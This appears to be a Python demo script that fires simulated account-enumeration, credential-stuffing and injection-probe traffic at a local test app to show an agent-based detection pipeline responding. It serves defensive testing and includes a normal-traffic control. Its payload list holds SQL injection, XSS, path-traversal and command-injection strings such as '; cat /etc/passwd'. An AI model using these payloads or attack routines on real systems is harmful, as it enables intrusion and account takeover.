"""Run an attack and watch it live: access log + every agent action, in this one terminal.

    .\\.venv-app\\Scripts\\python scripts\\attack_live.py                        # hybrid: enumerate, then log in against hits
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --auto-ack             # also acknowledge the On-Call page for you
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --pattern slow-hybrid  # same shape, spread over a longer, jittery window
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --pattern baseline    # normal traffic only -- Detection must NOT escalate
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --pattern burst       # pure credential-stuffing burst, no recon stage
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --stage enum          # enumeration only (see note below)
    .\\.venv-app\\Scripts\\python scripts\\attack_live.py --dry-run             # print the plan, send nothing

Patterns (``--pattern``), each a different shape against the same target app -- see the table in
docs/DEMO_SCRIPT.md for the expected Detection outcome and why:

  default      (the original Phase 6.1 attack) recon then credential-stuffing, back to back, ~0.05s
               between requests -- a fast, obviously scripted burst.
  slow-hybrid  the same two stages, but spread over a longer, randomly-paced window (no fixed cadence),
               to show Detection still catching a less obviously bursty pattern.
  baseline     NEGATIVE CONTROL: realistic normal traffic only -- a couple of valid logins, status
               checks, the occasional honest typo (the same proven shape as
               ``attack_simulate.py --pattern baseline``). No recon, no credential-stuffing. Detection
               should correctly NOT escalate this -- the point is proving the system does not cry wolf.
  burst        pure credential-stuffing, no recon stage: a short, high-volume burst of failed logins
               straight at the real usernames, from a handful of IPs.
  enum         (via --stage enum, not --pattern) recon only, the known Phase 6.1 gap -- see below.

The attack ("account-enumeration-then-credential-stuffing"), two stages against the target app's
deliberately unauthenticated ``GET /profile?username=`` (the IDOR planted in Phase 0):

  Stage 1 (recon):   walk a list of guessed usernames through /profile, one request each. A 200 confirms
                      the account exists; a 404 means it does not. No login is attempted yet.
  Stage 2 (credential-stuffing): take every username stage 1 confirmed and try a short list of common/leaked
                      passwords against /login, from the same source IPs. This is the shape a real attacker
                      follows: find out who exists before spending login attempts on them.

This is a different signal from the plain brute-force pattern (which guesses usernames blind, with no
recon step) -- here the login attempts are few and all aimed at confirmed accounts.

KNOWN GAP (tracked for Phase 7, not fixed here): Detection's window summary has no signal for
enumeration-only reconnaissance (repeated 404s with no login attempts), so stage 1 alone currently produces
escalate=False even at high volume -- it needs new summary fields (e.g. distinct-path-per-source, 404
ratio) before Detection can see that shape. --stage enum reproduces exactly that gap on demand, for anyone
who wants to see it; the default (--stage hybrid) adds stage 2 so the run also demonstrates the full
six-system response. Nothing here changes Detection's input data or window-summary logic.

While it runs, three things stream into this terminal, in colour:
  ACCESS  every line the target app writes to access.log (raw, unsanitized -- internal demo view)
  AGENT   every reasoning entry the agents write: the plain-English line, indented by what triggered it
  STATE   each incident's status changes (DETECTED -> CANDIDATE -> ASSESSED -> DISPATCHED -> CONTAINED ...)

The traffic goes through the Northwind site (:8081) like the other demo attacks, so Detection sees exactly
what it would see for a real visitor. Needs the stack up:  scripts\\run_demo.ps1 -NoAttack -Headless
Human steps stay human: ack the page (or pass --auto-ack) and sign off the customer notice yourself
(scripts\\comms_signoff.py). Nothing here touches agent logic; it only sends requests and reads the views.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests

# attack_simulate.py's baseline pattern is already proven (used by Phase 1/2's own Detection tests) --
# reuse its traffic shape and its "looks legitimate" source IPs rather than inventing a second one.
sys.path.insert(0, str(Path(__file__).resolve().parent))
from attack_simulate import LEGIT_IPS, VALID_CREDS  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
LOG_FILE = Path(os.environ.get("TARGET_APP_LOG_DIR", ROOT / "target_app" / "logs")) / "access.log"
SITE = "http://127.0.0.1:8081"
DEMO = "http://127.0.0.1:8091"
DASH = "http://127.0.0.1:8090"
ONCALL = "http://127.0.0.1:9104"

# Stage 1 target list. REAL_USERS are accounts the target app really has (target_app/app.py USERS); they
# are sprinkled among GUESSES so the 200s look found, not pre-known.
REAL_USERS = ["alice", "bob", "admin"]
GUESSES = ["root", "administrator", "test", "guest", "oracle", "support", "service", "dev", "ops", "backup",
           "jenkins", "git", "deploy", "postgres", "mysql", "ubuntu", "user", "demo", "info", "sales", "hr",
           "finance", "ceo", "cto", "billing", "api", "www", "mail", "ftp", "staff"]
IPS = ["198.51.100.23", "198.51.100.77", "203.0.113.141"]

# Stage 2: a short leaked/common-password list tried against each confirmed username. It deliberately
# does NOT include the real passwords (target_app/app.py USERS) -- a real attacker does not know those
# either; the point is credential-stuffing *attempts*, not a guaranteed compromise, exactly like the
# --successes flag on scripts/attack_simulate.py models a real brute force.
STUFFING_PASSWORDS = ["123456", "password", "qwerty123", "letmein", "admin123", "welcome1"]

# ---- terminal colour (Windows Terminal / modern conhost understand ANSI) --------------------------------
os.system("")
_C = {"dim": "\033[90m", "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "blue": "\033[94m",
      "mag": "\033[95m", "cyan": "\033[96m", "bold": "\033[1m", "off": "\033[0m"}
SYS_COLOR = {"detection": "blue", "threat_assessment": "mag", "containment": "red", "on_call": "yellow",
             "forensics": "cyan", "customer_comms": "green"}
_lock = threading.Lock()
_stop = threading.Event()


def out(text: str = "") -> None:
    with _lock:
        print(text, flush=True)


def paint(color: str, text: str) -> str:
    return f"{_C[color]}{text}{_C['off']}"


# ---- the attack -----------------------------------------------------------------------------------------
def plan_enum(count: int, seed: Optional[int]) -> List[Dict[str, str]]:
    """Stage 1: real users sprinkled through a long run of guesses, spread over the IPs."""
    rnd = random.Random(seed)
    names: List[str] = []
    pool = GUESSES + [f"user{n:03d}" for n in range(1, 200)]
    rnd.shuffle(pool)
    while len(names) < count:
        names.append(pool[len(names) % len(pool)])
    for u in REAL_USERS:                       # the harvest: each real profile is hit a couple of times
        for _ in range(2):
            names[rnd.randrange(len(names))] = u
    return [{"username": n, "ip": IPS[i % len(IPS)]} for i, n in enumerate(names)]


def _pause(delay: float, jitter: float) -> None:
    time.sleep(max(0.0, delay + (random.uniform(-jitter, jitter) if jitter else 0.0)))


def run_enum(steps: List[Dict[str, str]], delay: float, jitter: float = 0.0) -> List[str]:
    """Returns the usernames that came back 200 (confirmed to exist).

    ``jitter``: randomizes each pause by +/- this many seconds (slow-hybrid), so the pacing does not
    look like a scripted, uniform-cadence burst."""
    hits: List[str] = []
    seen: Dict[int, int] = {}
    with requests.Session() as s:
        for st in steps:
            try:
                r = s.get(f"{SITE}/profile", params={"username": st["username"]}, timeout=10,
                          headers={"X-Forwarded-For": st["ip"], "User-Agent": "python-scraper/2.0"})
                seen[r.status_code] = seen.get(r.status_code, 0) + 1
                if r.status_code == 200 and st["username"] not in hits:
                    hits.append(st["username"])
            except requests.RequestException as exc:
                out(paint("red", f"  ! request failed: {exc}"))
            _pause(delay, jitter)
    out(paint("bold", f"[stage 1: recon]    {len(steps)} requests, status breakdown={seen}, confirmed accounts={hits}"))
    return hits


def run_stuffing(usernames: List[str], delay: float, jitter: float = 0.0) -> Dict[int, int]:
    """Stage 2: try the password list against each confirmed username, from the same source IPs."""
    seen: Dict[int, int] = {}
    with requests.Session() as s:
        for i, username in enumerate(usernames):
            ip = IPS[i % len(IPS)]
            for pw in STUFFING_PASSWORDS:
                try:
                    r = s.post(f"{SITE}/login", json={"username": username, "password": pw}, timeout=10,
                               headers={"X-Forwarded-For": ip, "User-Agent": "python-scraper/2.0"})
                    seen[r.status_code] = seen.get(r.status_code, 0) + 1
                except requests.RequestException as exc:
                    out(paint("red", f"  ! request failed: {exc}"))
                _pause(delay, jitter)
    out(paint("bold", f"[stage 2: credential-stuffing]    {len(usernames) * len(STUFFING_PASSWORDS)} login attempts "
                      f"against {len(usernames)} confirmed account(s), status breakdown={seen}"))
    return seen


def run_burst(count: int, delay: float) -> Dict[int, int]:
    """Pure credential-stuffing, no recon stage: fail logins straight at the real usernames, high
    volume, short window -- the bursty counterpart to --pattern slow-hybrid."""
    seen: Dict[int, int] = {}
    with requests.Session() as s:
        for i in range(count):
            ip = IPS[i % len(IPS)]
            user = REAL_USERS[i % len(REAL_USERS)]
            pw = STUFFING_PASSWORDS[i % len(STUFFING_PASSWORDS)]
            try:
                r = s.post(f"{SITE}/login", json={"username": user, "password": pw}, timeout=10,
                           headers={"X-Forwarded-For": ip, "User-Agent": "python-scraper/2.0"})
                seen[r.status_code] = seen.get(r.status_code, 0) + 1
            except requests.RequestException as exc:
                out(paint("red", f"  ! request failed: {exc}"))
            time.sleep(delay)
    out(paint("bold", f"[burst: credential-stuffing, no recon]    {count} login attempts, no prior enumeration, "
                      f"status breakdown={seen}"))
    return seen


def run_baseline(count: int, delay: float) -> Dict[int, int]:
    """NEGATIVE CONTROL: realistic normal traffic, the same shape as attack_simulate.py's proven
    baseline pattern -- a couple of valid logins, status checks, one honest typo. No recon, no
    credential-stuffing. Detection should NOT escalate this."""
    seen: Dict[int, int] = {}
    with requests.Session() as s:
        for _ in range(count):
            ip = random.choice(LEGIT_IPS)
            roll = random.random()
            try:
                if roll < 0.5:
                    r = s.get(f"{SITE}/status", timeout=10,
                              headers={"X-Forwarded-For": ip, "User-Agent": "Mozilla/5.0 (demo baseline)"})
                elif roll < 0.85:
                    user = random.choice(list(VALID_CREDS))
                    r = s.post(f"{SITE}/login", json={"username": user, "password": VALID_CREDS[user]}, timeout=10,
                               headers={"X-Forwarded-For": ip, "User-Agent": "Mozilla/5.0 (demo baseline)"})
                else:   # one honest mistake -- a real user mistyping once
                    r = s.post(f"{SITE}/login", json={"username": "alice", "password": "wrongonce"}, timeout=10,
                               headers={"X-Forwarded-For": ip, "User-Agent": "Mozilla/5.0 (demo baseline)"})
                seen[r.status_code] = seen.get(r.status_code, 0) + 1
            except requests.RequestException as exc:
                out(paint("red", f"  ! request failed: {exc}"))
            time.sleep(delay + random.uniform(0.1, 0.4))
    out(paint("bold", f"[baseline: normal traffic]    {count} mixed, mostly-legitimate requests, "
                      f"status breakdown={seen} -- Detection should NOT open an incident for this"))
    return seen


# A genuinely different attack TYPE from everything above: not a credential guess, an injection/fuzzing
# probe. The target app does no SQL (USERS is a plain dict), so none of these can actually succeed --
# this models an attacker blindly trying known exploit payloads against a login form, which is exactly
# what automated scanners do against real-world sites regardless of what's actually behind the form.
INJECTION_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "admin'--", "admin' #", "' UNION SELECT 1,2,3--",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "; cat /etc/passwd", "| whoami", "$(whoami)", "`id`",
    "{{7*7}}", "${7*7}", "admin\x00", "a" * 400,
]


def run_injection_probe(count: int, delay: float) -> Dict[int, int]:
    """A different attack shape from everything else here: SQLi/XSS/path-traversal/command-injection
    payloads thrown at /login as both username and password, from a handful of IPs. None of these can
    work against this app (no SQL, no shell, no template engine behind the login) -- the point is the
    *probing* signature itself: many failed logins, unusual/malformed usernames, from a few IPs, fast.
    """
    seen: Dict[int, int] = {}
    with requests.Session() as s:
        for i in range(count):
            ip = IPS[i % len(IPS)]
            payload = INJECTION_PAYLOADS[i % len(INJECTION_PAYLOADS)]
            as_user = i % 2 == 0   # alternate which field carries the payload, like a real blind scanner
            body = {"username": payload, "password": "x"} if as_user else {"username": "admin", "password": payload}
            try:
                r = s.post(f"{SITE}/login", json=body, timeout=10,
                           headers={"X-Forwarded-For": ip, "User-Agent": "sqlmap/1.7-dev (fuzzer)"})
                seen[r.status_code] = seen.get(r.status_code, 0) + 1
            except requests.RequestException as exc:
                out(paint("red", f"  ! request failed: {exc}"))
            time.sleep(delay)
    out(paint("bold", f"[injection-probe: SQLi/XSS/path-traversal/command-injection payloads]    {count} requests "
                      f"against /login, {len(IPS)} source IPs, status breakdown={seen}"))
    return seen


# ---- live viewers -----------------------------------------------------------------------------------------
def tail_access_log() -> None:
    """Print each new access.log line as it is written (starts at the end of the file)."""
    pos = LOG_FILE.stat().st_size if LOG_FILE.exists() else 0
    buf = b""
    while not _stop.is_set():
        try:
            size = LOG_FILE.stat().st_size
        except OSError:
            time.sleep(0.2)
            continue
        if size < pos:
            pos, buf = 0, b""
        if size > pos:
            with open(LOG_FILE, "rb") as fh:
                fh.seek(pos)
                chunk = fh.read()
            pos += len(chunk)
            buf += chunk
            *lines, buf = buf.split(b"\n")
            for raw in lines:
                fmt_access(raw.decode("utf-8", errors="replace"))
        time.sleep(0.15)


def fmt_access(line: str) -> None:
    line = line.strip()
    if not line:
        return
    try:
        e = json.loads(line)
    except ValueError:
        out(paint("dim", f"ACCESS  {line[:150]}"))
        return
    code = e.get("status_code", 0)
    color = "green" if code < 300 else "yellow" if code < 400 else "red"
    who = f" user={e['username']}" if e.get("username") else ""
    outcome = f" [{e['auth_outcome']}]" if e.get("auth_outcome") else ""
    out(f"{paint('dim', 'ACCESS ')} {paint('dim', str(e.get('timestamp', ''))[11:23])}  {e.get('source_ip', ''):<15} "
        f"{e.get('method', ''):<4} {e.get('endpoint', ''):<9} {paint(color, str(code))}{who}{outcome}")


def watch_agents(t0_iso: str) -> None:
    """Print every reasoning entry written after the attack started, as the agents write it."""
    last = 0
    while not _stop.is_set():
        try:
            d = requests.get(f"{DEMO}/reasoning/events", params={"after": last, "limit": 100}, timeout=5).json()
            for e in d.get("events", []):
                last = max(last, e["event_id"])
                if e["ts"] >= t0_iso:
                    fmt_agent(e)
        except (requests.RequestException, ValueError):
            pass
        time.sleep(1.0)


def fmt_agent(e: Dict[str, Any]) -> None:
    color = SYS_COLOR.get(e["system"], "bold")
    ind = "   " * min(int(e.get("depth") or 0), 5)
    par = paint("yellow", "  [parallel]") if e.get("parallel") else ""
    out("")
    out(f"{paint('dim', 'AGENT  ')} {paint('dim', e['ts'][11:19])} {ind}{paint(color, e['system'].replace('_', ' ').upper())} "
        f"{paint('bold', e['agent_name'])}  {paint('dim', e.get('incident_id') or '')}{par}")
    out(f"{' ' * 17}{ind}{paint('bold', '-> ' + e['narration'])}")
    raw = [ln for ln in e["text"].splitlines() if ln.strip()][:4]
    for ln in raw:
        out(f"{' ' * 17}{ind}{paint('dim', '   ' + ln[:150])}")
    if len(e["text"].splitlines()) > 4:
        out(f"{' ' * 17}{ind}{paint('dim', '   ...')}")
    out("")


def watch_incidents(before: set, auto_ack: bool, result: Dict[str, Any]) -> None:
    """Print incident status changes; optionally acknowledge the On-Call page."""
    state: Dict[str, str] = {}
    acked: set = set()
    while not _stop.is_set():
        try:
            for i in requests.get(f"{DASH}/incidents", params={"limit": 6}, timeout=5).json()["incidents"]:
                iid = i["incident_id"]
                if iid in before:
                    continue
                result["incident"] = iid
                now = f"{i['status']} {i.get('severity') or ''}".strip()
                if state.get(iid) != now:
                    state[iid] = now
                    out(f"{paint('bold', 'STATE  ')} {time.strftime('%H:%M:%S')}  {iid}  {paint('cyan', now)}")
                    if i["status"] == "RESOLVED":
                        result["resolved"] = True
                if auto_ack and i["status"] == "DISPATCHED" and iid not in acked:
                    acked.add(iid)
                    r = requests.post(f"{ONCALL}/ack", params={"incident_id": iid, "who": "presenter"}, timeout=10)
                    out(f"{paint('yellow', 'HUMAN  ')} {time.strftime('%H:%M:%S')}  --auto-ack: acknowledged the page for {iid} ({r.status_code})")
        except (requests.RequestException, ValueError, KeyError):
            pass
        time.sleep(2.0)


# ---- main -----------------------------------------------------------------------------------------------
def preflight() -> Optional[str]:
    for name, url in (("Northwind site", f"{SITE}/status"), ("demo views (:8091)", f"{DEMO}/health"),
                      ("trace dashboard (:8090)", f"{DASH}/health"), ("On-Call", f"{ONCALL}/health")):
        try:
            requests.get(url, timeout=4).raise_for_status()
        except requests.RequestException:
            return f"{name} is not answering at {url}. Start the stack:  scripts\\run_demo.ps1 -NoAttack -Headless"
    return None


def _describe_and_dry_run(args) -> Optional[List[Dict[str, str]]]:
    """Prints the plan for the chosen --pattern/--stage. Returns stage-1 steps for default/slow-hybrid
    (the caller still has to run them), or None for patterns that build their own traffic inline."""
    if args.pattern == "baseline":
        out(paint("bold", "ATTACK: baseline (NEGATIVE CONTROL)  (--pattern baseline)"))
        out(f"  ~{max(args.count, 8)} mixed, mostly-legitimate requests: valid logins (alice/bob), /status "
            f"checks, one honest typo -- from {LEGIT_IPS} (the same source IPs attack_simulate.py's proven "
            "baseline uses). No recon, no credential-stuffing.")
        out(paint("yellow", "  Expected: Detection should NOT open an incident for this traffic."))
        return None
    if args.pattern == "burst":
        out(paint("bold", "ATTACK: credential-stuffing burst, no recon  (--pattern burst)"))
        out(f"  {max(args.count, 10)} login attempts straight at the real usernames {REAL_USERS}, "
            f"{len(IPS)} source IPs {IPS}, no enumeration first.")
        out(paint("yellow", "  Expected: Detection should escalate -- a pure credential-stuffing burst is "
                            "exactly its original brute-force signal, just aimed at known-real accounts."))
        return None
    if args.pattern == "injection-probe":
        out(paint("bold", "ATTACK: injection/fuzzing probe (SQLi, XSS, path-traversal, command-injection)  "
                          "(--pattern injection-probe)"))
        out(f"  {max(args.count, 20)} /login attempts with exploit-shaped payloads ({len(INJECTION_PAYLOADS)} "
            f"distinct payloads, e.g. {INJECTION_PAYLOADS[0]!r}, {INJECTION_PAYLOADS[5]!r}, {INJECTION_PAYLOADS[7]!r}) "
            f"as the username or password, {len(IPS)} source IPs {IPS}, UA sqlmap/1.7-dev (fuzzer).")
        out("  None of these can work -- the app does no SQL, no shell, no template rendering behind /login. "
            "This models a vulnerability scanner probing blind, a different attack TYPE from credential "
            "guessing even though it also lands as a pile of failed logins.")
        out(paint("yellow", "  Expected: likely escalates -- many failed logins across distinct 'usernames' from "
                            "a few IPs is the same signal credential_stuffing/brute_force already trips on, even "
                            "though the actual technique is unrelated. Worth narrating as a demo point."))
        return None
    steps = plan_enum(max(args.count, 10), args.seed)
    slow = args.pattern == "slow-hybrid"
    out(paint("bold", f"ATTACK: account-enumeration" + ("-then-credential-stuffing" if args.stage == "hybrid" else "")
                      + f"  (--pattern {args.pattern}, --stage {args.stage})"))
    out(f"  stage 1: {len(steps)} /profile requests, {len(IPS)} source IPs {IPS}, UA python-scraper/2.0, "
        f"real profiles hidden among guesses: {REAL_USERS}"
        + ("; paced slowly with random jitter, no fixed cadence" if slow else ""))
    if args.stage == "hybrid":
        out(f"  stage 2: up to {len(STUFFING_PASSWORDS)} login attempts per confirmed account "
            f"({len(STUFFING_PASSWORDS)} passwords: {STUFFING_PASSWORDS})")
        out(paint("yellow", "  Expected: Detection should escalate (Critical/High in the Phase 6.1 dry runs)."
                            + (" Slower pacing is not independently confirmed to still escalate -- watch and see."
                               if slow else "")))
    else:
        out(paint("yellow", "  --stage enum: recon only. This reproduces a known gap on purpose -- see the KNOWN GAP "
                            "note in this script's docstring, and docs/BACKLOG.md -- Detection currently will NOT "
                            "escalate this."))
    out("  stage-1 first 8: " + ", ".join(f"{s['username']}@{s['ip']}" for s in steps[:8]) + " ...")
    return steps


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--pattern", choices=["default", "slow-hybrid", "baseline", "burst", "injection-probe"],
                    default="default",
                    help="default: fast hybrid (Phase 6.1); slow-hybrid: same shape, slower/jittery pacing; "
                         "baseline: NEGATIVE CONTROL, normal traffic only; burst: pure credential-stuffing, "
                         "no recon; injection-probe: SQLi/XSS/path-traversal/command-injection payloads against "
                         "/login, a different attack TYPE from credential guessing. See the docstring and "
                         "docs/DEMO_SCRIPT.md for the expected outcome of each.")
    ap.add_argument("--stage", choices=["hybrid", "enum"], default="hybrid",
                    help="for --pattern default/slow-hybrid only: hybrid: recon then credential-stuffing "
                         "(produces a real incident); enum: recon only, reproduces the known Detection gap")
    ap.add_argument("--count", type=int, default=90, help="number of stage-1 /profile requests, or the request "
                                                           "count for baseline/burst (default 90)")
    ap.add_argument("--delay", type=float, default=0.05, help="seconds between requests (default 0.05)")
    ap.add_argument("--seed", type=int, default=None, help="fix the username order for a repeatable run")
    ap.add_argument("--watch", type=int, default=600, help="stop watching after this many seconds (default 600)")
    ap.add_argument("--auto-ack", action="store_true", help="acknowledge the On-Call page automatically")
    ap.add_argument("--dry-run", action="store_true", help="print the plan and send nothing")
    args = ap.parse_args()

    steps = _describe_and_dry_run(args)
    if args.dry_run:
        out(paint("yellow", "--dry-run: nothing sent."))
        return 0

    problem = preflight()
    if problem:
        out(paint("red", problem))
        return 1
    before = {i["incident_id"] for i in requests.get(f"{DASH}/incidents", params={"limit": 50}, timeout=10).json()["incidents"]}
    t0_iso = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
    result: Dict[str, Any] = {}
    for fn, a in ((tail_access_log, ()), (watch_agents, (t0_iso,)), (watch_incidents, (before, args.auto_ack, result))):
        threading.Thread(target=fn, args=a, daemon=True).start()
    time.sleep(1.5)

    out(paint("bold", f"\n=== ATTACK STARTED {time.strftime('%H:%M:%S')} ===  (Ctrl+C stops watching; the agents keep going)\n"))
    if args.pattern == "baseline":
        run_baseline(max(args.count, 8), args.delay)
    elif args.pattern == "burst":
        run_burst(max(args.count, 10), args.delay)
    elif args.pattern == "injection-probe":
        run_injection_probe(max(args.count, 20), args.delay)
    else:
        jitter = args.delay * 4 if args.pattern == "slow-hybrid" else 0.0
        delay = args.delay * 6 if args.pattern == "slow-hybrid" else args.delay
        confirmed = run_enum(steps, delay, jitter)
        if args.stage == "hybrid":
            if confirmed:
                run_stuffing(confirmed, delay, jitter)
            else:
                out(paint("yellow", "stage 1 confirmed no accounts; skipping stage 2 (re-run with a different --seed)."))
    out(paint("dim", "Watching the agents. Detection can take a minute to open an incident; the models can take a few more.\n"
                     "Human steps if you did not pass --auto-ack:\n"
                     f"  Invoke-RestMethod -Method Post \"{ONCALL}/ack?incident_id=<id>&who=presenter\"\n"
                     "  .\\.venv-app\\Scripts\\python scripts\\comms_signoff.py list --incident <id>\n"))
    deadline = time.time() + args.watch
    quiet_warned = False
    try:
        while time.time() < deadline and not result.get("resolved"):
            time.sleep(1.0)
            if not quiet_warned and "incident" not in result and time.time() > deadline - args.watch + 150:
                quiet_warned = True
                if args.pattern == "baseline":
                    out(paint("green", "No incident after 2.5 minutes: that is the expected, correct outcome for "
                                       "--pattern baseline -- Detection is not supposed to escalate this."))
                elif args.stage == "enum":
                    out(paint("yellow", "No incident after 2.5 minutes: this is the known gap (see KNOWN GAP in the "
                                        "docstring) -- Detection's window summary has no enumeration signal yet."))
                else:
                    out(paint("yellow", "No incident after 2.5 minutes: Detection judged this window as not worth "
                                        "escalating. Try --count 200 for a bigger stage 1."))
    except KeyboardInterrupt:
        out(paint("yellow", "\nstopped watching (the agents continue in the background)."))
    time.sleep(1.5)
    _stop.set()
    if result.get("resolved"):
        out(paint("green", f"\nincident {result['incident']} reached RESOLVED."))
    elif result.get("incident"):
        out(f"\nlast seen incident: {result['incident']} (not yet resolved).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
